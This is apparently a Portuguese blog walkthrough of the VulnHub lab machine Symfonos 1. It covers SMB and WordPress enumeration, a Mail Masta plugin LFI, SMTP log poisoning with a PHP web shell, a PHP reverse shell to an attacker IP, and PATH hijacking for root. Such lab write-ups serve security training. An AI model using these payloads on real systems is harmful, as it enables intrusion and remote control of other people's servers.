---
title: "VulnHub - Symfonos 1"
tags: [Linux,Easy,Poison,Wordpress,Gobuster,Web]
categories: VulnHub OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/inicial.png)

Link: <https://www.vulnhub.com/entry/symfonos-1,322/>

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.100/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 5 portas abertas no servidor

> Porta 22 -> Servidor SSH (?!)

> Porta 25 -> Servidor SMTP

> Porta 80 -> Servidor Web

> Portas 139 e 445 -> Servidor SMB

## Enumeração da Porta 80 (Web)

Abrimos ela no navegador pra se tem algo de interessante

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/web.png)

Vamos rodar o gobuster também

```bash
gobuster dir -u http://192.168.56.105/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/web1.png)

Nada... vamos prosseguir...

## Enumeração da Porta 445 (SMB)

Pessoalmente eu não gosto de usar o enum4linux, primeiro vou rodar o `smbclient` com login anonimo, pra ver se temos acesso à algo

E sim, tem uma pasta estranha ali

```bash
smbclient -L \\192.168.56.105
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/smb.png)

Então agora vamos acessar ela pra ver se encontramos algo de útil

```bash
smbclient //192.168.56.105/anonymous -U % -N
```

Baixamos o arquivo attention.txt e lemos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/smb1.png)

Falou sobre credenciais... interessante, e tem um nome de usuário ali em baixo **Zeus**

### Login como helios

Bom, sabemos que **helios** é um deus também... será que não pode ser um usuário da máquina?

```bash
smbclient //192.168.56.105/helios -U % -N
smbclient //192.168.56.105/helios -U helios
```

A senha era **qwerty**...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/smb2.png)

Baixamos esses dois arquivos e lemos eles

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/smb3.png)

Bom, paraceu ser um site esse **/h3l105**, então acessamos na página ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/web2.png)

## WordPress

Sabendo que se trata de um `wordpress`, vamos iniciar a enumeração dele

```bash
wpscan --url http://192.168.56.105/h3l105 --enumerate u
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/wp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/wp1.png)

Beleza, enumeramos um usuário, mas nada que possamos fazer de exploração ainda

Pô, aqui eu travei por um bom tempo, tive que dar uma olhada nos blogs da vida por ai pra achar uma solução, e encontrei no blog do [mzrf](https://blog.mzfr.me/vulnhub-writeups/2019-07-04-symfonos)

Adicinar o host `symfonos.local` no /etc/host e fazer um wpscan em cima dele

Então vamos lá

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/hosts.png)

```bash
wpscan --url http://symfonos.local/h3l105/ -e p --no-banner --no-update --api-token 8vus7pA***********
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/wp2.png)

Como não temos conta ainda... esse LFI pareceu bem interessante

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/wp3.png)

### LFI Plugin WordPress

**WordPress Plugin Mail Masta 1.0 - Local File Inclusion**

[ExploitDB](https://www.exploit-db.com/exploits/40290)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/masta.png)

Lendo o exploit, o link 'vulnerável' é esse

`http://192.168.56.105/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

Comprovando

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/masta1.png)

Beleza, temos um LFI, mas não temos muito oq fazer... por enquanto

## SMTP Log Poisoning

Isso mesmo, a gente vai fazer um Log Poison no SMTP através do LFI pra conseguirmos RCE

[Referencia-LEIA](https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/)

1º Devemos verificar se temos acesso à caixa de email do usuário

**http://192.168.56.105/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios**

Sim, temos...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/rce.png)

2º Acessamos a caixa de e-mail dele pelo terminal

```
telnet 192.168.56.105 25
MAIL FROM: <RCE>
RCPT TO: Helios
data
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['cmd']); ?>

.
```

Enviado! Verificamos novamente no LFI

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/rce2.png)

Confirmando, temos RCE

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/rce3.png)

Agora pegamos uma Reverse Shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/rce4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/rce5.png)

# Helios -> Root

Bom, vamos iniciar a escalação de privilégio agora

Como boa prática, vamos executar o [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/lin.png)

Baixamos e executamos na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/lin1.png)

O que nos retornou de bacana foi esse **/opt/statuscheck**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/lin2.png)

Também achou a senha do banco de dados, depois vamos verificar isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/lin3.png)

Então agora verificamos o que esse statuscheck faz

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/lin4.png)

Pelo que parece ele faz um `curl`

## Mudando o PATH

O que podemos fazer é um 'curl' mudando o path do nosso usuário, e sendo assim ele vai executar esse curl que a gente criou, que na verdade é um reverse shell de root

```
echo $'#!/bin/sh\n/bin/sh' > curl
chmod +x curl
export PATH=$(pwd):$PATH
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/lin5.png)

## Ganhando ROOT

Agora é só correr pro abraço!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/lin6.png)

## Flags

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/root.png)

# Algo a mais

Tem algumas coisa que seria interessante a gente explorar aqui. Aquele wordpress pra enumerar a vulnerabilidade realmente não encontrei outro modo a não ser copiar e colar do outro blog.

## Outro modo de Reverse Shell

Outro modo, não sei se mais interessante de se garantir um reverse shell é inserir diretamente o reverse no email

```php
<?php $sock=fsockopen("192.168.56.102",444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/reverse.png)

Atualizamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/reverse1.png)

Recebemos o shell!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/reverse2.png)

## Banco de Dados

Que tal darmos uma explorada nesse banco de dados que tem ali?

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/db.png)

Aqui conseguimos o hash do usuário Admin, mas não temos mais muito o que fazer, por aqui fim da linha!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos1/db1.png)